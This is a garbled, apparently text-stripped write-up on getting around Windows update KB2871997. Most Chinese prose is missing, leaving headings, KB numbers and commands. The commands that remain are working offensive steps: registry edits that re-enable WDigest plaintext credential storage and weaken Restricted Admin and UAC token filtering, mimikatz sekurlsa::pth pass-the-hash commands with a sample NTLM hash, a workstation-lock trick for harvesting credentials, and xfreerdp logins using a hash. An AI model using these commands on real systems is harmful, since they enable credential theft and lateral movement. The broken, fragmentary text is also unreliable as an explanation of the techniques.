Bypass KB2871997
0x01 KB2871997
1
 2014513
2
2014  7  8 
 (CredSSP) 
2973351 Microsoft   2919355  Windows 
2975625 Microsoft  2919355  Windows 
2014  9  9 
2982378 Microsoft :  Windows 7  Windows Server 2008 R2 
2014  10  14 
2984972  Windows 7  Windows Server 2008 R2 
2984976  2592687 8.0  Windows 7  
Windows Server 2008 R2   2984976  2984972
2984981  2830477 8.1  Windows 7  
Windows Server 2008 R2   2984981  2984972
2973501  Windows 8Windows Server 2012  Windows RT 
0x02 TokenLeakDetectDelaySecs 
1
Win7Win8
1 TokenLeakDetectDelaySecs 
2 WDigest 
1
2
2
 dword 30 
 30  
3 3126593 (MS16-014) 
 3126593  
 TokenLeakDetectDelaySecs  0 
0x03 WDigest 
1 Wdigest 
 WDigest  
 UseLogonCredential 
UseLogonCredential  0WDigest  1 
2Bypass KB2871997
Win7Server 2008 R2Windows 8  Server 2012  UseLogonCredential  1
 Windows 8.1  Server 2012 R2  ( ,UseLogonCredential  
0
 WDigest  UseLogonCredential  1 
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\TokenLeakDetectDela
ySecs
1
HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\WDige
st
1
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest 
/v UseLogonCredential /t REG_DWORD /d 1 /f
1
0x04 KB2871997 
1SID
whoami /priv SID
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest 
/v UseLogonCredential /t REG_DWORD /d 1 /f
1
rundll32.exe user32.dll LockWorkStation
1
#include
int main(){
    LockWorkStation();
  return 0;
}
1
2
3
4
5
//cs
desktop [explorer pid] x86|x64 low|high
//msf
migrate [explorer pid]
screenshot
1
2
3
4
5
6
S-1-5-113: NT AUTHORITY\Local 
S-1-5-114: NT AUTHORITY\Local 
1
2
SID
S-1-5-113 S-1-5-114  Administrators  114  113 
 SID """
â€œ/
2Restricted Admin RDP Overpass-the-hash)
Restricted Admin RDP   Client 
Windows 8.1  Windows Server 2012 R2 
Windows 7  Windows Server 2008 R2  KB2871997KB2973351
 Restricted Admin mode (2)
13126593
2 (DisableRestrictedAdmin 0  1 )
Restricted Admin mod RDP
 Restricted Admin mode 
Pass the Hash with Remote Desktop
Restricted Admin mode Windows
 Pass The Hash (Pass the Hash with Remote Desktop) 
Server  Restricted Admin modeClient Restricted Admin mode
mimikatz pth attack
mimikatz  pth (Pass The Hash), Overpass-the-hash  "Pass-the-Key"
reg add HKLM\System\CurrentControlSet\Control\Lsa /v 
DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f
1
mstsc.exe /restrictedadmin
1
privilege::debug
sekurlsa::pth /user:d4rksec /domain:192.168.100.8 
/ntlm:5a60baa90ab348a171ef29426a0a98df "/run:mstsc.exe 
/restrictedadmin"
1
2
.
 xfreerdp  Bypass Restricted Admin Mode ()
0x05 
1UAC
UAC
1UACAdministrators
2fulladministrator
3AccessTokenUAC
4 RID  500 administrator 
UAC
FilterAdministratorToken
Server 2008 Disable(),RID500
 FilterAdministratorToken  1 administrator 
xfreerdp /u:administrator /p:p3ssw0rd /v:192.168.100.8 /cert-ignore
xfreerdp /u:administrator /p:5a60baa90ab348a171ef29426a0a98df 
/v:192.168.100.8 /cert-ignore
1
2
3
Server RDP  Restricted Admin mod 
Overpass-the-Hash  
LocalAccountTokenFilterPolicy
 UAC  LocalAccountTokenFilterPolicy  1 
 0 
LocalAccountTokenFilterPolicy  0 )
reg add 
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v 
FilterAdministratorToken /t REG_DWORD /d 00000001 /f
1
reg add 
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v 
FilterAdministratorToken /t REG_DWORD /d 00000000 /f
1
sekurlsa::pth /domain:192.168.100.8 /user:administrator 
/ntlm:5a60baa90ab348a171ef29426a0a98df "/run:mstsc.exe 
/restrictedadmin"
1
reg add 
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v 
LocalAccountTokenFilterPolicy /t REG_DWORD /d 00000001 /f
1
reg add 
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v 
LocalAccountTokenFilterPolicy /t REG_DWORD /d 00000000 /f
1
0x06 
https://support.microsoft.com/zh-cn/help/2871997/microsoft-security-advisory-update-to-improv
e-credentials-protection-a
https://support.microsoft.com/zh-cn/help/4488256/how-to-block-remote-use-of-local-accounts-in
-windows
https://docs.microsoft.com/en-us/security-updates/SecurityAdvisories/2016/2871997
https://support.microsoft.com/en-us/help/2973351/microsoft-security-advisory-registry-update-t
o-improve-credentials-pro
https://docs.microsoft.com/en-us/windows/security/identity-protection/remote-credential-guard